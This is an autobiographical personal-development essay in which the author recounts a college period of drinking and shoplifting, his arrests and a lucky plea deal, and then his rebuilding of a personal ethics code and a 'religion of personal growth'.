I not only shed my old religious beliefs , but along with it went my whole concept of morality .
I was like the guy in Mark Twain ’s short story “ The Facts Concerning the Recent Carnival of Crime in Connecticut , ” a story about a guy who kills his conscience .
I started embracing all the stuff that was basically the opposite of my upbringing .
I completely lost all interest in school and hardly ever went to class .
I really did n’t care at all about getting my degree .
I went to parties almost every week and drank a lot , one time doing about 14 drinks in a row and waking up with no memory of how I got to bed .
I had to ask friends to piece together pieces of the previous night .
To this day I ’m certain I drank more alcohol before the age of 21 than after ( and I ’m 34 now ) .
I also started shoplifting — a lot .
The first time I did it simply because it was something I ’d never done before , something I could never do as a Catholic .
It was like a task to be marked off a checklist .
But I soon became addicted to the emotional high of it , and I kept doing it more and more , eventually to the point of doing it several times a day .
I virtually never stole stuff to keep it .
I ’d give away most of what I stole to other people , or I ’d just throw it in the trash afterwards .
About a month into my first semester , I got arrested .
4 months probation .
I took about a week off and went right back to it , although I became a bit more cautious about it .
One week after the probation period ended , I got arrested again and ended up with 40 hours of community service .
I did the service , and soon went right back into stealing .
But I refined my methods even more , making it much harder for me to get caught .
A few close calls only gave me more confidence .
I grew so accustomed to this behavior that I could steal without my heart skipping a beat .
No fear .
So I had to keep upping the dosage .
At first I started setting little goals , like seeing how many large candy bars I could fit in my pockets at once ( 13 ) , or trying to steal every bottle of white out from the student store in one day ( over 50 bottles ) .
Then I just gave away all the candy and white out to fellow students .
I was n’t doing well in school and was put on academic probation too .
They do that when you do n’t show up to class .
I ca n’t say I really cared much though .
But things went from bad to worse when I met another student who was about as morally corrupted as I was , and we became fast friends .
I stopped doing the ( risky ) shoplifting , and together we planned and implemented a two - person theft where the odds of getting caught were very low .
It worked again and again , and we both started making some actual money from it .
To play it safe and not keep hitting the same locations over and over , we expanded our circle to go way beyond Berkeley to an almost 100 - mile radius , from San Francisco to Sacramento to Fresno .
Over a period of about a year , we gradually escalated each theft to a dollar value that was now well into the grand theft range ( at the time any theft above $ 400 ) .
I think our weekend record was about $ 2400 worth of stuff .
Should n’t Have Done That
Eventually I got caught again , this time for grand theft .
Not good .
Before this arrest I had discovered that because of my priors , I ’d be looking at about two years in jail if I got convicted of grand theft .
Not good at all .
And to make it even worse , I was arrested in Sacramento , about a 2 - hour drive from Berkeley .
But my partner could n’t wait around and expose himself too , so he drove back .
I was stuck sitting in the county jail for an ID hold .
I never stole with ID on me , and I gave the police one of my many fake names , but they of course did n’t take my word for it , so I had to wait in a cell while they ran my fingerprints trying to figure out who I was .
So there I was … 19 years old , sitting in jail on Superbowl Sunday 1991 .
Expecting that I was about to lose my freedom for the next two years .
THUNK !
That was the sound of reality crashing down around me .
For the first several hours , I was in shock , unable to think straight .
Maybe it was the orange clothes .
But with nothing to do but sit and think for an indefinite period of time , I started asking all the big questions again .
What the hell was I doing here ?
Was this really me ?
But now my answers were very different .
I realized that this context was all wrong .
I resigned myself to the fact that I ’d have to spend the next couple years in jail , but I also knew that I had changed permanently and that this way of life had now ended .
Two years in jail … this would be a painful lesson .
But at least I had learned it .
I did n’t have a complete replacement context yet , but I began to plant the seed of one .
That seed was the realization that no matter how bad things seemed , in the future they could be better .
I knew I would eventually recover and rebound .
It might be a number of years before I was back on my feet again , but I knew with certainty that I could survive it .
Although I would n’t have labeled it as such at the time , this was the moment when the idea of personal growth got planted in me .
It was the idea that no matter how bad things are right now , I still have the capacity to grow through them and to emerge in a better position in the future .
That idea was all I had , but it was enough to allow me to cope .
Three days later I was released .
They ’d succeeded in identifying me .
I was given a court date and sent on my way , charged with felony grand theft .
It was around sunset .
At first I walked around the Capitol building and garden in Sacramento , just enjoying the fresh air and happy that I ’d at least have a few more months of freedom .
Jail is extremely boring , and I was just in the county jail , not prison .
Unfortunately I had a more immediate problem to deal with .
I had no ID , only $ 18 cash on me , and I had to find a way to go 120 miles to get back home .
As luck would have it , I was able to take a late night bus to Oakland for only $ 16 , and from there my ( ex ) partner gave me a ride home .
Upon returning to my apartment , I found in the mail a letter from UC Berkeley stating that I was expelled .
They do that when your GPA starts with the decimal point .
A Broken Frame
For the next few months while waiting for my court date , I was in a bit of a funk .
I did n’t do much of anything at all .
I slept a lot , took long walks , and played a lot of video games .
It ’s hard to set goals when you expect to be going to jail for a while .
Eventually I got a lawyer and met with him to discuss my case .
Before I could open my mouth , he said , “ Well , I ’ve reviewed your case , and since this is your first offense , I ’m pretty sure we can get it reduced to petty theft , so you ’d only end up with some community service if we plead no contest .
I ’m on great terms with the D.A. , so I ’m pretty sure he ’ll go for it .
I strongly advise against going to trial , as the evidence against you is overwhelming , seeing as you were caught red handed . ”
First offense ?
Huh ?
Immediately my brain filled with thoughts like , “ Why does he think this is my first offense ?
Does n’t he know about my priors ?
And if he thinks this is a first offense , will the rest of the court also think it ’s a first offense ?
Should I correct my lawyer on this oversight ? ”
After mulling it over in my mind for a few seconds , I decided I ’d damn well better keep my mouth shut .
It might backfire on me , but there was a chance that it might frontfire too .
I figured that worst case , I ’d have an angry lawyer to deal with .
But the best case was too good to pass up .
Grand theft was a felony ; petty theft was only a misdemeanor .
I had to take the risk .
Of course , taking risks was something all too familiar for me .
Several weeks later we went to court .
My plan was to keep my mouth shut as much as possible and only say the absolute minimum .
Outside the courtroom I reviewed the court ’s basic info about the case .
They had indeed connected me with my real identity , but they also had my fake name listed too .
No priors were listed .
My best guess is that someone screwed up and searched for priors based on my fake name instead of my real name , even though the case was going to court under my real name .
Human error ?
Computer error ?
Who knows ?
But one big error either way .
Sure enough when we got into the courtroom ( a place that was becoming increasingly familiar ) , the court remained under the assumption that this was a first offense and processed it as such .
I pleaded no contest to the reduced charge of petty theft and got 60 hours community service .
I did those 60 hours like it was a dream job , knowing that it could have been 17,520 hours .
My head was spinning .
What had just happened ?
The next two years were now mine again .
Construction Time Again
Soon I moved back to L.A. and got a nothing retail sales job for $ 6 / hour and took a few nothing classes on the side .
I ’d had quite enough excitement over the past couple years , and I just wanted to enjoy a quiet normal life for a while … spend some time below the radar .
I reconnected with old high school friends who were going to UCLA and hung out at their fraternity house at times , but I usually stayed clear of the parties .
I played a lot of frisbee golf , tennis , and computer games ( especially the Sierra adventure games which were popular in the early 90s ) .
I tried to keep life very simple .
I spent a lot of time analyzing my experience at Berkeley , needing to understand it so as to be able to prevent myself from ever going down that path again .
But I kept my thoughts about all this to myself .
I knew I had a lot of personal rebuilding to do , but I also knew that I could n’t go backwards .
The morals and beliefs by which I was raised were broken , but living without a sense of conscience clearly was n’t an option .
Was a belief in God required to live by a code of ethics ?
I became aware that despite how negative my experiences seemed , they forever changed me in a good way too .
By going through those experiences , I had unlocked access to a part of myself that was previously dormant — my courage .
Although I had done things that were very foolish , they also took a lot of courage to do .
I learned to act in spite of fear again and again .
And this conditioning stayed with me .
Because I had already faced the prospect of going to jail , any failure that would have a lesser negative consequence than jail would n’t phase me .
To this day fear of failure has very little power over me .
I just say to myself , “ Hey , if it ’s not going to land me in jail , how bad could it be ? ”
Of course I had to learn how to temper this courage with some sense of morality and common sense .
So during this year of quiet reflection , I gradually shifted my context to create a new personal code of ethics to guide me .
But instead of being rooted in religion , I built it in a more humanistic manner , integrating values like honor , honesty , integrity , humility , and fairness .
It was a very deliberate and conscious rebuilding process that would continue for at least a few more years .
But even during this time of 1991 - 92 as I was just beginning , it gave me some stability and gradually became my most empowering context up to that point .
It did n’t take me long to realize that the courage I had developed could become a powerful asset for me if I learned how to use it intelligently .
I was ready for a new challenge .
Nothing to Fear
In the Fall of 1992 , I decided to go back to college , starting over as a freshman .
This time I went to Cal State University , Northridge ( CSUN ) .
The computer science program was n’t impacted , so all I had to do to get accepted was to apply .
I moved into the dorms at age 21 .
But I was no longer the same person I was at 18 .
I was still an atheist religiously , but now I had a strong collection of personal values to guide me .
I wanted to see what I was capable of and what these new values might do for me , especially the value of integrity .
There would be no cheating , no stealing , no drinking .
For me it was all about setting goals and taking action and pushing myself to do my best .
My courage was like a new power source , but now I had a strong harness on it .
My Berkeley friends had said to me , “ If you ’d put all the energy you put into criminal behavior into your studies , you ’d get straight As . ”
But I knew I could get straight As. I ’d done that in high school taking all honors classes .
That was n’t a big enough challenge .
So I upped the bar my first semester , opting to take 31 units ( 10 classes ) .
The average student takes 12 - 15 units per semester .
Unfortunately the dean of the computer science department would n’t approve my extra units .
She was the gatekeeper , and she thought I was either joking or nuts .
I talked her up from 18 units to 25 units , but there she stood firm , and even then she still thought I was probably joking .
So I took 25 units at CSUN and enrolled in another six units off campus , for a total of 31 units .
That was against the rules , since the extra unit approval was technically inclusive of off - campus units too , but I was n’t going to let pointless bureaucracy stop me .
I devoted myself to the study of time management and learned to use my time very efficiently .
I aced all my classes and took my straight - A report cards from both schools back to the dean , now asking for 39 units for my second semester .
This time it was n’t hard to get her approval , but I think she was a bit scared of me when I left .
I aced that semester too .
Then in the summer of 1993 I did full - time contract work as a game programmer and also went vegetarian .
No summer school .
In my third and final semester , I added a double major in mathematics ( which was pretty easy to get , since there were so many courses in common with computer science ) , and I took 37 units while continuing to work full - time .
I graduated with a 3.94 GPA and ended up receiving an award for the top computer science student each year .
Two degrees in three semesters .
This experience gave me a deeper appreciation of the power of context .
I would not have even attempted such a thing as a Catholic .
I would never have set the goals I did .
I ’m not sure anyone can truly understand how different reality seems from the perspective of different contexts if you ’ve never switched contexts .
If you subscribe to a disempowering context , you may be absolutely crippled in your ability to effectively tackle certain challenges no matter how hard you try ( if you even try at all ) .
In the year after graduation , I started Dexterity Software , met my future wife , and continued to explore different belief systems .
But now I was doing it very consciously .
I was driven by the idea that if one context could open the door to previously untapped potential , then what could other contexts do ?
Might there be a better context than my current one ?
My experiences at Berkeley and CSUN were totally opposite , and I knew it was because of my different belief systems .
One “ religion ” nearly sent me to prison ; the other allowed me to successfully tap into potential I never knew was within me .
I absolutely had to learn more about this .
Over the next decade I experimented with agnosticism , various new - agey belief systems , Buddhism , objectivism , and more .
I even tried Scientology for a few months just to see what it was like .
I wanted to assimilate a variety of different contexts , experience them from the inside , and then back off and compare their strengths and weaknesses .
This produced a lot of instability in my life but also tremendous growth .
I was like a chef trying different ingredients to discover what recipe of beliefs would lead to the best life .
And again , the definition of “ best ” is part of the recipe itself , so my understanding of the meaning of life was also in flux .
Many times I found that a new context set me back , and my results began to decline .
Other times my new context was more empowering , and I again started to surge ahead .
In the long run as I integrated new empowering beliefs and shed disempowering ones , my life began to improve across the board .
For the past year they ’ve been fairly stable , and 2005 has by far been my best year ever .
Flexible
Our beliefs act as lenses .
These lenses can help us see things we ca n’t otherwise see , but they can also block us from seeing parts of reality .
I see a huge part of personal development as the study of these lenses — these belief systems .
There are an infinite number of lenses , so the quest never ends , but the more lenses you examine personally , the more you understand about the nature of reality and your role within it .
I have not experienced any organized belief system that is not disempowering in some way .
The problem is that they all have a fixed perspective .
If you look at reality from any single perspective , you are only perceiving the projection of reality onto your belief system , not reality itself .
The more rigid your perspective , the more detail you miss ( detail which does n’t fall upon your projection but does fall upon others ) , and the less of your true potential you ’re able to tap .
For several years I would have described my religion as a field and not a fixed point .
It was multi-contextual .
I kept the context floating and tried to see reality from multiple perspectives .
At first this was unsettling and made it hard to set goals and take action , but I found it worthwhile because it gave me much greater clarity .
I began seeing patterns in where certain perspectives would lead , both for myself and others .
Just as you might imagine where a life of crime will ultimately lead , you can also gain a subtler understanding of where a belief in a certain type of God will lead and how that path compares to other choices .
This is complicated because we are n’t dealing with fixed points for either the starting point or the destination .
It ’s about fields of possibility leading to fields of potential .
For example , a life of crime can begin and end in many ways , but you can still see some general patterns in the pathways from start to finish .
You can make some generalizations that will be fairly accurate .
As a result of this introspection , I was able to shed certain beliefs and strengthen others .
Some beliefs I found consistently disempowering , meaning that if I adopted them , I would be denying myself access to valuable potential .
These included the belief in heaven / hell and the belief in a higher power .
That second one may seem surprising , but I opted to let it go because I consistently found it less empowering than a belief in a lower power .
An example of a higher power would be a consciously aware God or gods such as found in Christianity or Greek mythology .
A lower power would be like a field that is able to respond to your intentions , sort of like “ the force ” in Star Wars or what some people refer to as “ source . ”
You can pray to either type of power , but in the first case you ’re asking , and in the second case , you ’re declaring .
Many people , myself included , have noted that declarative prayer works better than no prayer and better than asking prayer .
I see it mainly as putting out an intention .
So in deciding which beliefs to embrace and which to drop , I keep going back to the concepts of empowerment and potential .
I strive to dump beliefs that curtail my ability to access my potential while strengthening beliefs that unlock more potential .
If one form of prayer does n’t seem to work at all , but another one works often , I ’m going to adopt more of the latter context .
World in My Eyes
My overall religion has effectively become a religion of personal growth .
Every year I continue to tweak my beliefs to try to bring them into closer alignment with my best understanding of how reality actually works .
The better we understand reality , the more potential we unlock .
Just as understanding a new law of physics can allow us to do things we could never previously do , beliefs about reality work the same way .
If you ’re stuck with a belief in a flat earth , it ’s going to limit your potential actions and results .
Similarly , if your religious beliefs are too great a mismatch for actual reality , you ’ll be doomed to spend your life only tapping a fraction of your true potential .
In my “ religion , ” knowingly leaving my potential untapped is sinful .
Personal optimization is deeply embedded into my sense of morality .
Not growing is morally wrong to me — it runs contrary to my understanding of the purpose of life .
The only reliable means I ’ve found for discovering what beliefs are empowering is to test them and compare them to other beliefs .
This is something I initially fell into unconsciously and in a very destructive manner .
But when done consciously and intelligently , it can give you a whole new perspective on life .
Just as people who travel a lot report being changed by their experiences of other cultures , you can also expect to be changed by experiencing different belief systems .
I do n’t expect everyone else to subscribe to my religion of course .
It was a very personal choice of mine and has been undoubtedly shaped by my unique experiences .
Yet choosing my beliefs consciously has allowed me access to parts of my potential that I ’d never have been able to tap with other belief systems .
In most cases I ’d have been stuck being way too passive and would have failed to push myself .
I ’d have been more inclined to accept my given lot in life instead of consciously co-creating it .
Because my religion is based on working actively on my personal growth and helping others to do the same , I am driven to take action .
Good thoughts or intentions are n’t enough .
Another part of my religion is to strive to become the best me I can become , not a copy of Jesus or Buddha or anyone else .
This means spending a lot of time learning about my own strengths and weaknesses and figuring out where I can grow and what I may have to simply accept .
Everything Counts
Do your current beliefs empower you to be your best , or do they doom you to live as a mere shadow of what you could be ?
Can you honestly say that you are doing your best or very close to it ?
Are you living congruently with your most deeply held beliefs ?
Whatever your religious or spiritual beliefs , how well do you practice them ?
Do you walk your talk ?
On Monday as I walked around the Las Vegas Strip , I saw a downtrodden homeless man sitting on one of the overhead walkways asking for money .
As over a hundred people passed by him each minute , no one even stopped to give him a kind word or a smile .
I thought to myself , “ Where are all the Christians ? ”
If Jesus is the model for Christian behavior , what would Jesus do in that situation ?
What would other role models do ?
What would you do ?
By their words I hear that most Americans are Christian .
By their actions I see that most are n’t .
If you really believe something , you will act in accordance with that belief — always .
If you believe in gravity , you will never attempt to defy it .
If you claim to hold a belief but act incongruently , then you do n’t actually believe it .
You ’re only kidding yourself .
Casual faith is n’t .
Actions , not words , reveal beliefs .
If you want to understand what you truly believe , observe your actions .
This may take some courage to do , but if you follow the trail of your actions , it will lead you to a more congruent belief system .
And once there you can begin consciously moving towards new beliefs that empower you , while your actions and beliefs remain congruent along the way .
But you ’ll make no progress as long as you claim to believe one thing but consistently act in violation of it .
Most people in such a situation will spend time trying to get their actions to better reflect their so - called beliefs … and meet with nothing but frustration .
I say first get your beliefs in line with your actions and reach the point of being totally honest with yourself , doubts and all .
Then you ’ll find it far easier to move forward .
Do n’t be afraid to do this — no divine being is going to smite you for being honest with yourself .
And if one ever happens to show up , you always have me to use as a scapegoat . 😉
Although it can be a bumpy ride ( it certainly was for me ) , you ’ll come out the other end a far more integrated and empowered human being .
Internal incongruencies absolutely cripple us , forcing us to live on only a fraction of our potential .
When our actions and beliefs are in conflict , we ca n’t think as well .
We become less intelligent and less resourceful — easily manipulated by others .
We have no clarity at all , and we ca n’t seem to get moving in a consistent direction .
We ’re like a rudderless ship , being tossed around by the waves .
Congruency is clarity .
When you get clear about what you truly believe about reality by observing your actions and admitting the deepest , darkest truths to yourself that you never wanted to face , you ’ll set yourself on a path of growth that will put all your earlier accomplishments to shame .
You ’ll unlock access to resources that were previously dormant — greater intelligence , greater awareness , greater conscience .
And you ’ll finally start living up to the greatness that has been too long buried under a pile of denial .
Do n’t be afraid to face who you really are .
You ’re a lot stronger than you realize .
And Then …
Tomorrow we ’ll explore how you can make the biggest decision of all :
How shall you live , and for what ?
